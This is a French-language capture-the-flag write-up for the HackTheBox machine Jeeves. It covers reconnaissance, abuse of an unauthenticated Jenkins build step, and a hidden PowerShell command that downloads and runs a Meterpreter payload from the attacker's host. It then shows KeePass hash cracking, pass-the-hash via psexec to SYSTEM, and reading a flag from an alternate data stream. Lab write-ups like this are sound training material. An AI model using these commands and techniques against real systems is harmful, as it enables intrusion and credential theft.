# Solution du CTF Jeeves de HackTheBox

Présentation
------------

Le CTF Jeeves était proposé par *HackTheBox*.  

[HackTheBox](https://www.hackthebox.eu/) est un réseau privé virtuel composé de machines vulnérables sous différentes architectures (Windows, Linux, BSD, Solaris).  

Chaque machine du réseau correspond à un CTF et il faut récupérer deux flags à savoir le *user.txt* (que l'on peut lire généralement lors de l'obtention d'un shell avec un utilisateur non privilégié) et le *root.txt* (une fois que l'on a escaladé ses privilèges pour être root, SYTEM ou l'administrateur local).  

J'ai terminé *Jeeves* il y a quelques moment mais j'attendais que la box soit retirée du réseau avant de poster une solution.  

Côté *HackTheBox* j'ai choisi de me concentrer sur les machines Windows afin d'en apprendre plus sur le pentest Windows et pour changer des habituelles VM Linux de chez VulnHub.  

Les machines Windows que j'ai résolu jusqu'à présent sont *Jeeves*, *Chatterbox*, *Bart*, *Silo* et *Rabbit*. A l'heure actuelle il me reste *Fighter* et *Dropzone* :)   

L'avantage de HTB par rapport à d'autres CTF c'est la simplicité de mise en place (pas de téléchargement de VM, pas de configuration, il suffit de lancer openvpn) et aussi une ambiance visuelle proposée par le site et une communauté assez active. Le tout avec un système de points pour se mesurer aux autres participants :)  

Parmi les inconvénients je noterais les latences (surtout pour les scans de ports et brute force), l'instabilité de certaines machines et services et des joueurs peu fair-game qui par exemple tuent les process des autres participants (sans avoir rien à y gagner).  

Dans l'ensemble et surtout dans mon cas le gros avantage de HTB c'est de fournir des machines Windows ce qu'il est compliqué de faire pour une plateforme comme *VulnHub* (copyrights, licences, etc).  

Ask Jeeves !
------------

On démarre comme d'habitude avec les ports ouverts :  

```plain
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|10 (90%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10 cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 10 1511 - 1607 (85%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2018-04-12 21:27:04
|_  start_date: 2018-04-12 20:17:59
```

Il y a un serveur *Eclipse Jetty* sur le port 50000 qui n'est pas soumis à une vulnérabilité connue d'après [cve-details](https://www.cvedetails.com/vulnerability-list/vendor_id-10410/product_id-34824/Eclipse-Jetty.html). Une précédente version était vulnérable à un directory traversal tout bête mais après vérification en long, en large et travers la faille ne s'applique effectivement pas à la version du serveur :'(   

Le port 80 est une copie du site *ask.com* de l'époque (maintenant il n'y a plus *Jeeves*) et tous les liens retournent une image d'erreur en relation avec Java (indice ?)  

![Jeeves HTB default page](https://raw.githubusercontent.com/devl00p/blog/master/images/htb_jeeves/jeeves_80.png)

Il fallait alors faire preuve d'une certaine logique ou être armé d'un dictionnaire bien fournit et lancer un directory-buster sur le port 50000 et ainsi trouver une installation *Jenkins* non protégée (pas d'authentification) à l'adresse /askjeeves/.  

![Jeeves HTB open Jenkins installation](https://raw.githubusercontent.com/devl00p/blog/master/images/htb_jeeves/jeeves_jenkins.png)

Boss de milieu de jeu
---------------------

Le module *Metasploit* *auxiliary/scanner/http/jenkins\_command* permet de faire facilement exécuter des commandes avec les droits du service qui s'avère être l'utilisateur *jeeves\kohsuke*.  

On peut ainsi lister le contenu du dossier Jenkins :  

```plain
[+] 10.10.10.63:50000     Directory of C:\Users\Administrator\.jenkins
[+] 10.10.10.63:50000     
[+] 10.10.10.63:50000     04/17/2018  09:36 AM    <DIR>          .
[+] 10.10.10.63:50000     04/17/2018  09:36 AM    <DIR>          ..
[+] 10.10.10.63:50000     04/17/2018  09:42 AM                48 .owner
[+] 10.10.10.63:50000     04/17/2018  09:36 AM             1,433 config.xml
[+] 10.10.10.63:50000     04/17/2018  09:34 AM             1,400 FJUyqDTmCFV.bat
[+] 10.10.10.63:50000     04/17/2018  08:34 AM               156 hudson.model.UpdateCenter.xml
[+] 10.10.10.63:50000     04/17/2018  08:58 AM             1,178 hudson.plugins.emailext.ExtendedEmailPublisher.xml
[+] 10.10.10.63:50000     11/03/2017  10:43 PM               374 hudson.plugins.git.GitTool.xml
[+] 10.10.10.63:50000     11/03/2017  10:33 PM             1,712 identity.key.enc
[+] 10.10.10.63:50000     04/17/2018  08:40 AM             2,295 jeeves-veil.bat
[+] 10.10.10.63:50000     04/17/2018  09:36 AM                94 jenkins.CLI.xml
[+] 10.10.10.63:50000     04/17/2018  09:28 AM           102,552 jenkins.err.log
[+] 10.10.10.63:50000     11/03/2017  10:47 PM           360,448 jenkins.exe
[+] 10.10.10.63:50000     11/03/2017  10:47 PM               331 jenkins.exe.config
[+] 10.10.10.63:50000     04/17/2018  08:34 AM                 4 jenkins.install.InstallUtil.lastExecVersion
[+] 10.10.10.63:50000     11/03/2017  10:45 PM                 4 jenkins.install.UpgradeWizard.state
[+] 10.10.10.63:50000     04/17/2018  09:36 AM               138 jenkins.model.DownloadSettings.xml
[+] 10.10.10.63:50000     12/24/2017  03:38 PM             2,688 jenkins.out.log
[+] 10.10.10.63:50000     04/17/2018  08:32 AM                 4 jenkins.pid
[+] 10.10.10.63:50000     04/17/2018  09:36 AM               169 jenkins.security.QueueItemAuthenticatorConfiguration.xml
[+] 10.10.10.63:50000     04/17/2018  09:36 AM               162 jenkins.security.UpdateSiteWarningsConfiguration.xml
[+] 10.10.10.63:50000     11/03/2017  10:47 PM        74,271,222 jenkins.war
[+] 10.10.10.63:50000     04/17/2018  08:32 AM            34,147 jenkins.wrapper.log
[+] 10.10.10.63:50000     11/03/2017  10:49 PM             2,881 jenkins.xml
[+] 10.10.10.63:50000     04/17/2018  08:37 AM    <DIR>          jobs
[+] 10.10.10.63:50000     11/03/2017  10:33 PM    <DIR>          logs
[+] 10.10.10.63:50000     04/17/2018  08:34 AM               907 nodeMonitors.xml
[+] 10.10.10.63:50000     11/03/2017  10:33 PM    <DIR>          nodes
[+] 10.10.10.63:50000     11/03/2017  10:44 PM    <DIR>          plugins
[+] 10.10.10.63:50000     11/03/2017  10:47 PM               129 queue.xml.bak
[+] 10.10.10.63:50000     11/03/2017  10:33 PM                64 secret.key
[+] 10.10.10.63:50000     11/03/2017  10:33 PM                 0 secret.key.not-so-secret
[+] 10.10.10.63:50000     04/17/2018  08:41 AM    <DIR>          secrets
[+] 10.10.10.63:50000     04/17/2018  09:36 AM             8,192 TempRacer.exe
[+] 10.10.10.63:50000     11/08/2017  09:52 AM    <DIR>          updates
[+] 10.10.10.63:50000     11/03/2017  10:33 PM    <DIR>          userContent
[+] 10.10.10.63:50000     11/03/2017  10:33 PM    <DIR>          users
[+] 10.10.10.63:50000     11/03/2017  10:47 PM    <DIR>          war
[+] 10.10.10.63:50000     11/03/2017  10:43 PM    <DIR>          workflow-libs
[+] 10.10.10.63:50000     04/17/2018  08:41 AM    <DIR>          workspace
```

Pour autant ce module s'est montré récalcitrant à exécuter des commandes plus poussées, ce qui m'a amener à trouver une exécution de commande plus simple.  

En tant que développeur je ne connais pas *Jenkins* mais je connais mieux *Gitlab* et ses mécanismes d'intégration et tests continus. Aussi je n'ai pas été surpris de trouver une option où l'on peut faire exécuter un script bat en rajoutant une étape de *build* à un projet.  

![Jeeves HTB build step](https://raw.githubusercontent.com/devl00p/blog/master/images/htb_jeeves/jenkins_build_step.png)

Il n'y a plus qu'à créer un nouveau projet vide et rajouter les commandes suivantes pour télécharger et exécuter un reverse *Meterpreter* (j'ai nommé le fichier *jre.exe* pour plus de discrétion) :  

```plain
powershell.exe -w hidden -nop -ep bypass -c "(new-object net.webclient).DownloadFile('http://10.10.15.67:8000/jre.exe', 'C:\Users\Administrator\.jenkins\logs\jre.exe')" & C:\Users\Administrator\.jenkins\logs\jre.exe') &
```

La particularité de *HackTheBox* c'est que plusieurs personnes peuvent plancher au même moment sur la machine... Ça peut être amusant d'observer la méthodologie des autres participants mais le revers de la médaille c'est que les scripts des autres participants peuvent spoiler une étape de challenge...  

De plus comme une machine peut devenir instable, il est possible de la réinitialiser depuis le site. Certains en abusent pensant à tord qu'un exploit n'a pas fonctionné pour X raisons (mais pour certaines machines il s'avère que c'est souvent une étape nécessaire).  

A cause de cela il arrive qu'on ait à répéter les même étapes, comme si on était dans *Un jour sans fin* :D  

Dans le dossier *Jenkins* précédemment listé on trouve différentes clés (*master.key*, *secret.key*, *initialAdminPassword*, etc) malheureusement il manque le fichier *credentials.xml* [qui aurait pu](https://www.n00py.io/2017/01/compromising-jenkins-and-extracting-credentials/) nous permettre de trouver un password à tester ailleurs.  

Lors de mes errances quelqu'un a déposé à un moment un *credentials.xml* qui a du mettre les autres participants sur une mauvaise piste... sympa :(   

Avec notre shell *Meterpreter* on en en mesure d'accéder au fichier *user.txt* (le flag de mi-parcours du challenge) qui est dans le bureau de l'utilisateur. En revanche le système Windows semble bien patché, et le module *local\_exploit\_suggester* est d'ailleurs peu bavard.  

Boss final
----------

Il est temps de fouiller ailleurs et toujours parmi les fichier de *kohsuke* on trouve un énigmatique fichier avec l'extension *kdbx* qui s'avère lié au gestionnaire de mots de passes *Keepass*.  

Après avoir téléchargé le fichier via *Meterpreter* il est temps de trouver quoi en faire... Un simple *apt-cache keepass* suffira à me mettre sur le chemin de *keepass2john* qui permet de convertir le hash de la passphrase maîtresse dans un format cassable via *John The Ripper*.  

```plain
devloop@kali:~/Documents$ keepass2john CEH.kdbx
CEH:$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b7
3766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

Armé de la wordlist *rockyou* le mot de passe tombe relativement vite (*moonshine1*). On peut alors ouvrir l'archive *KeePass* pour voir les mots de passes stockés.  

![Jeeves HTB Keepass vault](https://raw.githubusercontent.com/devl00p/blog/master/images/htb_jeeves/keepass2_screenshot.png)

On remarque surtout la présence d'un hash au format Windows (Lanman/NTML) qu'on s'empresse d'utiliser avec le module *psexec* de *Metasploit* :  

```plain
msf exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   RHOST                 10.10.10.63                                                        yes       The target address
   RPORT                 445                                                                yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                     no        The service display name
   SERVICE_NAME                                                                             no        The service name
   SHARE                 ADMIN$                                                             yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write fo
lder share
   SMBDomain             .                                                                  no        The Windows domain to use for authentication
   SMBPass               aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00  no        The password for the specified username
   SMBUser               Administrator                                                      no        The username to authenticate as

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.15.121     yes       The listen address
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.15.121:4444
[*] 10.10.10.63:445 - Connecting to the server...
[*] 10.10.10.63:445 - Authenticating to 10.10.10.63:445 as user 'Administrator'...
[*] Sending stage (206403 bytes) to 10.10.10.63
[*] Sleeping before handling stage...
[*] 10.10.10.63:445 - Selecting PowerShell target
[*] 10.10.10.63:445 - Executing the payload...
[+] 10.10.10.63:445 - Service start timed out, OK if running a command or non-service executable...
[*] Meterpreter session 1 opened (10.10.15.121:4444 -> 10.10.10.63:49878) at 2018-04-19 20:00:54 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Fake news
---------

Avec ces nouveaux privilèges on ne retrouve pas la trace du flag final (*root.txt*). A la place on remarque un fichier texte :  

```plain
meterpreter > cat "c:\Documents and Settings\Administrator\Desktop\hm.txt"
The flag is elsewhere.  Look deeper.
```

Victory
-------

J'ai eu recours à l'utilitaire [streams.exe de SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/streams) pour fouiller la présence [d'ADS](https://docs.microsoft.com/en-us/sysinternals/downloads/streams) sur le système, ce qui nous ramène... sur le même fichier :  

```plain
c:\Documents and Settings\Administrator\Desktop\hm.txt:
1621538:        :root.txt:$DATA 34
```

L'accès au stream alternatif est facilité par le support des *ADS* par *Metasploit* :  

```plain
meterpreter > cat "c:\Documents and Settings\Administrator\Desktop\hm.txt:root.txt:$DATA"
afbc5bd4b615a60648cec41c6ac92530
```


*Published May 24 2018 at 22:37*